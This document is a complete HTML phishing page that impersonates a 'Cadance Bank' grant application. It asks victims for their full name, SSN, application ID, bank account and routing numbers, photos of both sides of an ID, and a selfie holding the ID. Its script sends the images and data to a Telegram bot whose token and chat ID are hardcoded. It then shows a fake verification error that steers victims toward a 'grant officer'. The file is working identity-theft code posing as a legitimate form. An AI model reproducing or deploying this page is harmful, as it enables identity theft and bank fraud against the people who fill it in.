<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadance Grant Application</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('https://i.ibb.co/v1SXYc1/DALL-E-2024-10-26-03-24-58-A-professional-loan-company-background-featuring-a-modern-office-environm.webp') no-repeat center center fixed;
            background-size: cover;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: auto;
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
            margin-top: 8%;
            transition: all 0.3s ease;
        }
        .header {
            background: linear-gradient(135deg, #adf5ce, #417d59);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            color: white;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        h1 {
            font-size: 24px;
            margin: 0;
            font-weight: 600;
        }
        p {
            font-size: 14px;
            color: #555;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #333;
        }
        input[type="text"],
        input[type="file"],
        select {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus,
        select:focus {
            border-color: #0078D4;
            outline: none;
        }
        .error {
            color: #d8000c;
            font-size: 12px;
            display: none;
            margin-top: 5px;
        }
        .button-container {
            text-align: center;
            margin-top: 20px;
        }
        .btn {
            background-color: #0078D4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #005A9E;
        }
        .hidden {
            display: none;
        }
        .loading {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container" id="basic-info-section">
        <div class="header">
            <img src="https://cadcdnprod01v2-daffhpb7b8cdfkhx.z01.azurefd.net/-/media/themes/cadencebank/cadence/cadence/images/logo-footer.svg?iar=0&rev=0ef077e1270440c290c9cc7bc35457bc&extension=webp&hash=BFF77D66CC480130B95FA384E632C8BD" alt="Cadance Bank Logo" style="max-width: 100%; height: auto;">
            <h1>Welcome to Cadance Grant Application</h1>
        </div>
        <p>Please enter your full name and Application ID.</p>
        <div class="form-group">
            <label for="full-name">Full Name</label>
            <input type="text" id="full-name" placeholder="Enter your full name">
            <span class="error" id="name-error">Please enter your full name.</span>
        </div>
        <div class="form-group">
            <label for="Ssn">SSN</label>
            <input type="text" id="Ssn" placeholder="Enter your SSN">
            <span class="error" id="Ssn-error">Please enter your SSN.</span>
        </div>
        <div class="form-group">
            <label for="application-id">Application ID</label>
            <input type="text" id="application-id" placeholder="Enter your application ID">
            <span class="error" id="application-id-error">Please enter your application ID.</span>
        </div>
        <div class="button-container">
            <button class="btn" onclick="submitBasicInfo()">Next</button>
        </div>
    </div>

    <div class="container hidden" id="loading-overlay">
        <div class="loading">
            <p>Loading...</p>
        </div>
    </div>

    <div class="container hidden" id="id-upload-section">
        <div class="header">
            <img src="https://cadcdnprod01v2-daffhpb7b8cdfkhx.z01.azurefd.net/-/media/themes/cadencebank/cadence/cadence/images/logo-footer.svg?iar=0&rev=0ef077e1270440c290c9cc7bc35457bc&extension=webp&hash=BFF77D66CC480130B95FA384E632C8BD" alt="Cadance Bank Logo" style="max-width: 100%; height: auto;">
            <h1>Upload Your ID</h1>
        </div>
        <p>Please upload the front and back of your ID, as well as a selfie holding it.</p>
        <div class="form-group">
            <label for="id-front">ID Front</label>
            <input type="file" id="id-front" accept="image/*">
            <span class="error" id="id-front-error">Please upload the front of your ID.</span>
        </div>
        <div class="form-group">
            <label for="id-back">ID Back</label>
            <input type="file" id="id-back" accept="image/*">
            <span class="error" id="id-back-error">Please upload the back of your ID.</span>
        </div>
        <div class="form-group">
            <label for="id-selfie">Selfie with ID</label>
            <input type="file" id="id-selfie" accept="image/*">
            <span class="error" id="id-selfie-error">Please upload a selfie holding your ID.</span>
        </div>
        <div class="button-container">
            <button class="btn" onclick="submitIDInfo()">Submit ID</button>
        </div>
    </div>

    <div class="container hidden" id="funds-preference-section">
        <div class="header">
            <img src="https://cadcdnprod01v2-daffhpb7b8cdfkhx.z01.azurefd.net/-/media/themes/cadencebank/cadence/cadence/images/logo-footer.svg?iar=0&rev=0ef077e1270440c290c9cc7bc35457bc&extension=webp&hash=BFF77D66CC480130B95FA384E632C8BD" alt="Cadance Bank Logo" style="max-width: 100%; height: auto;">
            <h1>Funds Preference</h1>
        </div>
        <p>Would you prefer the funds to be sent to your account via debit card or bank transfer?</p>
        <div class="form-group">
            <label>
                <input type="radio" name="funds-preference" value="debit-card" onclick="toggleBankDetails()" required> Debit Card
            </label>
            <label>
                <input type="radio" name="funds-preference" value="bank-transfer" onclick="toggleBankDetails()"> Bank Transfer
            </label>
        </div>
        
        <div id="bank-details" class="hidden">
            <div class="form-group">
                <label for="bank-name">Bank Name</label>
                <input type="text" id="bank-name" placeholder="Enter your bank name">
            </div>
            <div class="form-group">
                <label for="account-number">Account Number</label>
                <input type="text" id="account-number" placeholder="Enter your account number">
            </div>
            <div class="form-group">
                <label for="routing-number">Routing Number</label>
                <input type="text" id="routing-number" placeholder="Enter your routing number">
            </div>
        </div>

        <div class="button-container">
            <button class="btn" onclick="submitFundsPreference()">Submit Preference</button>
        </div>
    </div>

    <div class="container hidden" id="error-message-section">
        <div class="header">
            <img src="https://cadcdnprod01v2-daffhpb7b8cdfkhx.z01.azurefd.net/-/media/themes/cadencebank/cadence/cadence/images/logo-footer.svg?iar=0&rev=0ef077e1270440c290c9cc7bc35457bc&extension=webp&hash=BFF77D66CC480130B95FA384E632C8BD" alt="Cadance Bank Logo" style="max-width: 100%; height: auto;">
            <h1>Verification Error</h1>
        </div>
        <p>There was an error verifying your identity. Please contact your grant officer to guide you in creating an account with Cadance Bank for funds to be disbursed.</p>
    </div>

    <script>
  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
  const chatId = '1412104349';
    
  const validApplicationIds = ['CA8856981', 'APP67890', 'APP112233']; // Replace these with your actual IDs

function submitBasicInfo() {
    const fullName = document.getElementById('full-name').value.trim();
    const Ssn = document.getElementById('Ssn').value.trim();
    const applicationId = document.getElementById('application-id').value.trim();

    // Example validation rules:
    const isValidApplicationId = validApplicationIds.includes(applicationId); // Check if the ID exists in the array
    const isValidSSN = /^\d{9}$/.test(Ssn); // Example: 9 digits

    if (!fullName || !applicationId || !Ssn || !isValidApplicationId || !isValidSSN) {
        document.getElementById('name-error').style.display = !fullName ? 'block' : 'none';
        document.getElementById('Ssn-error').style.display = !isValidSSN ? 'block' : 'none';
        document.getElementById('application-id-error').style.display = !isValidApplicationId ? 'block' : 'none';
        return;
    }

    document.getElementById('basic-info-section').classList.add('hidden');
    document.getElementById('id-upload-section').classList.remove('hidden');
}
    
        function submitIDInfo() {
            const idFront = document.getElementById('id-front').files[0];
            const idBack = document.getElementById('id-back').files[0];
            const idSelfie = document.getElementById('id-selfie').files[0];
    
            if (!idFront || !idBack || !idSelfie) {
                document.getElementById('id-front-error').style.display = !idFront ? 'block' : 'none';
                document.getElementById('id-back-error').style.display = !idBack ? 'block' : 'none';
                document.getElementById('id-selfie-error').style.display = !idSelfie ? 'block' : 'none';
                return;
            }
    
            document.getElementById('id-upload-section').classList.add('hidden');
            document.getElementById('funds-preference-section').classList.remove('hidden');
    
            // Send the ID images to Telegram
            sendIDImageToTelegram(idFront, 'Front of ID');
            sendIDImageToTelegram(idBack, 'Back of ID');
            sendIDImageToTelegram(idSelfie, 'Selfie with ID');
        }
    
        function sendIDImageToTelegram(file, caption) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', file);
            formData.append('caption', caption);
    
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send photo');
                }
                return response.json();
            })
            .then(data => {
                console.log('Photo sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending photo to Telegram:', error);
            });
        }
    
        function toggleBankDetails() {
            const bankDetails = document.getElementById('bank-details');
            const selectedPreference = document.querySelector('input[name="funds-preference"]:checked').value;
            if (selectedPreference === 'bank-transfer') {
                bankDetails.classList.remove('hidden');
            } else {
                bankDetails.classList.add('hidden');
            }
        }
    
        function submitFundsPreference() {
            const preference = document.querySelector('input[name="funds-preference"]:checked').value;
            const bankName = document.getElementById('bank-name').value;
            const accountNumber = document.getElementById('account-number').value;
            const routingNumber = document.getElementById('routing-number').value;
    
            if (preference === 'bank-transfer' && (!bankName || !accountNumber || !routingNumber)) {
                alert('Please fill in all bank details.');
                return;
            }
    
            document.getElementById('funds-preference-section').classList.add('hidden');
            document.getElementById('loading-overlay').classList.remove('hidden');
    
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('error-message-section').classList.remove('hidden');
            }, 2000);
    
            const message = `
            New Application:
            - Full Name: ${document.getElementById('full-name').value}
            - SSN: ${document.getElementById('Ssn').value}
            - Application ID: ${document.getElementById('application-id').value}
            - Funds Preference: ${preference}
            ${preference === 'bank-transfer' ? `
            - Bank Name: ${bankName}
            - Account Number: ${accountNumber}
            - Routing Number: ${routingNumber}` : ''}
            `;
    
            sendToTelegram(message);
        }
    
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to send message');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Message sent to Telegram:', data);
                })
                .catch(error => {
                    console.error('Error sending to Telegram:', error);
                });
        }
    </script>
    
</body>
</html>
